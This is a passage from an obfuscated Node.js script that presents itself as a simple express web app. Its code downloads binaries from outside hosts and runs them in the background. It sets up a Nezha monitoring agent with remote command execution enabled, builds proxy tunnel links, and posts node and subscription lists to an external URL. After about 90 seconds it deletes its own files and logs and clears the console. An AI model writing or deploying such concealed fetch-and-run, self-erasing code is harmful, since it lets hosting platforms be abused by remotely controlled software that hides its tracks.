20token\x20connect\x20to\x20tunnel','Unhandled\x20error\x20in\x20startserver:','https://arm64.ssss.nyc.mn/bot','env','path','\x20failed:\x20','158904jlJGgh','https://amd64.ssss.nyc.mn/web','\x0a\x20\x20tunnel:\x20','includes','join','log','charAt','500417BMSpcA','NAME','\x20>/dev/null\x202>&1','Error\x20in\x20startserver:','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','send','tcp','Unknown','unlink','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','/sub.txt\x20saved\x20successfully','ArgoDomain:','list.txt','floor','PORT','filter','206716gDryeD','8443','--tls','1379901wYngqb','readFileSync','set','blackhole','all','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','clear','Empowerment\x20success\x20for\x20','close','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','&path=%2Fvless-argo%3Fed%3D2560#','\x20>\x20nul\x202>&1','tunnel.json','aarch64','SUB_PATH','railway','chmod','abcdefghijklmnopqrstuvwxyz','block','success','post','\x0a\x0atrojan://','443','statSync','http\x20server\x20is\x20running\x20on\x20port:','51052mHZmLv','Empowerment\x20failed\x20for\x20','npm\x20running\x20error:\x20','https://ipapi.co/json/','php\x20running\x20error:\x20','\x20-c\x20\x22','2083','https://arm64.ssss.nyc.mn/v1','127.0.0.1','axios','UUID','Nodes\x20uploaded\x20successfully','stringify','Error\x20executing\x20command:\x20','http','2087','?security=tls&sni=','countryCode','from','sub.txt','Download\x20','cdns.doon.eu.org','win32','\x20successfully','/config.json\x20>/dev/null\x202>&1\x20&','Subscription\x20uploaded\x20successfully','pkill\x20-f\x20\x22[','random','child_process','fileUrl','config.yaml','express','App\x20is\x20running','ARGO_DOMAIN:','https://arm64.ssss.nyc.mn/web','3612910BBqNPj','Content-Type','/api/add-subscriptions','145rlMMYP','utf-8','push','org','51d9f31b-cab0-477b-b14e-541599504b27','taskkill\x20/f\x20/im\x20','finish','automatic\x20access\x20task\x20added\x20successfully','\x20>/dev/null\x202>&1\x20&','readdirSync','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','nohup\x20','2716932kldvSP','boot.log','get','application/json','true','text/plain;\x20charset=utf-8','railway.linxinxin.de5.net','/api/delete-nodes','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','/vmess-argo?ed=2560','arm','length','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','mkdirSync','&path=%2Ftrojan-argo%3Fed%3D2560#'];_0x5b06=function(){return _0x364911;};return _0x5b06();}async function uploadNodes(){const _0x508e87={_0x6db77d:0x1d0,_0x3aff4c:0x1fa,_0x3a7d40:0x1ee,_0x1ae016:0x239,_0x26b7ce:0x237,_0x2ef917:0x1bd,_0x38a638:0x23d,_0x468bf9:0x1b8,_0x2b474d:0x20a},_0x3c66f6=_0xf99686;if(UPLOAD_URL&&PROJECT_URL){const _0x5872ee=PROJECT_URL+'/'+SUB_PATH,_0x5c23ed={'subscription':[_0x5872ee]};try{const _0xb2ed63=await axios[_0x3c66f6(_0x508e87._0x6db77d)](UPLOAD_URL+_0x3c66f6(_0x508e87._0x3aff4c),_0x5c23ed,{'headers':{'Content-Type':_0x3c66f6(0x20a)}});return _0xb2ed63&&_0xb2ed63[_0x3c66f6(0x237)]===0xc8?(console['log'](_0x3c66f6(_0x508e87._0x3a7d40)),_0xb2ed63):null;}catch(_0x2f6523){if(_0x2f6523[_0x3c66f6(0x239)]){if(_0x2f6523[_0x3c66f6(_0x508e87._0x1ae016)][_0x3c66f6(_0x508e87._0x26b7ce)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x3c66f6(0x25a)](listPath))return;const _0x1ad8be=fs[_0x3c66f6(_0x508e87._0x2ef917)](listPath,_0x3c66f6(0x1fc)),_0xeccb86=_0x1ad8be[_0x3c66f6(_0x508e87._0x38a638)]('\x0a')[_0x3c66f6(_0x508e87._0x468bf9)](_0xcdfe5d=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x3c66f6(0x253)](_0xcdfe5d));if(_0xeccb86['length']===0x0)return;const _0x36164b=JSON[_0x3c66f6(0x1e1)]({'nodes':_0xeccb86});try{const _0x18e96f=await axios[_0x3c66f6(0x1d0)](UPLOAD_URL+'/api/add-nodes',_0x36164b,{'headers':{'Content-Type':_0x3c66f6(_0x508e87._0x2b474d)}});return _0x18e96f&&_0x18e96f['status']===0xc8?(console[_0x3c66f6(0x269)](_0x3c66f6(0x1e0)),_0x18e96f):null;}catch(_0x25a1e6){return null;}}else return;}}function cleanFiles(){const _0x27d0c5={_0x572cce:0x23e,_0x3fc132:0x24b,_0x31b528:0x268,_0x280d38:0x26d},_0x14bdf1={_0xe51a35:0x1c2};setTimeout(()=>{const _0x28e551={_0x21de31:0x1f5,_0x7a86d2:0x205},_0x4d9f9d=_0x1ee8,_0xb013a1=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0xb013a1['push'](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0xb013a1['push'](phpPath);process[_0x4d9f9d(_0x27d0c5._0x572cce)]===_0x4d9f9d(0x1eb)?exec(_0x4d9f9d(_0x27d0c5._0x3fc132)+_0xb013a1[_0x4d9f9d(_0x27d0c5._0x31b528)]('\x20')+_0x4d9f9d(0x1c7),_0x2b9e26=>{const _0x18b4fe=_0x4d9f9d;console[_0x18b4fe(_0x14bdf1._0xe51a35)](),console['log'](_0x18b4fe(0x1f5)),console['log'](_0x18b4fe(0x205));}):exec(_0x4d9f9d(0x243)+_0xb013a1['join']('\x20')+_0x4d9f9d(_0x27d0c5._0x280d38),_0x293cee=>{const _0x594582=_0x4d9f9d;console[_0x594582(0x1c2)](),console['log'](_0x594582(_0x28e551._0x21de31)),console['log'](_0x594582(_0x28e551._0x7a86d2));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x29f731={_0x27dff8:0x241,_0x5b86a4:0x269,_0x4ff7e6:0x202,_0x3ea72f:0x23f},_0x2f0c8c=_0xf99686;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x2f0c8c(0x269)](_0x2f0c8c(0x24a));return;}try{const _0x255f06=await axios[_0x2f0c8c(0x1d0)](_0x2f0c8c(_0x29f731._0x27dff8),{'url':PROJECT_URL},{'headers':{'Content-Type':'application/json'}});return console[_0x2f0c8c(_0x29f731._0x5b86a4)](_0x2f0c8c(_0x29f731._0x4ff7e6)),_0x255f06;}catch(_0x536ec4){return console[_0x2f0c8c(0x248)](_0x2f0c8c(0x218)+_0x536ec4[_0x2f0c8c(_0x29f731._0x3ea72f)]),null;}}async function startserver(){const _0x44befc={_0x37bb71:0x248,_0x92876d:0x26e},_0x319d58=_0xf99686;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x5c90b4){console[_0x319d58(_0x44befc._0x37bb71)](_0x319d58(_0x44befc._0x92876d),_0x5c90b4);}}startserver()[_0xf99686(0x21b)](_0x50c15a=>{const _0x10b49b=_0xf99686;console['error'](_0x10b49b(0x25f),_0x50c15a);}),app[_0xf99686(0x25b)](PORT,()=>console[_0xf99686(0x269)](_0xf99686(0x1d4)+PORT+'!'));
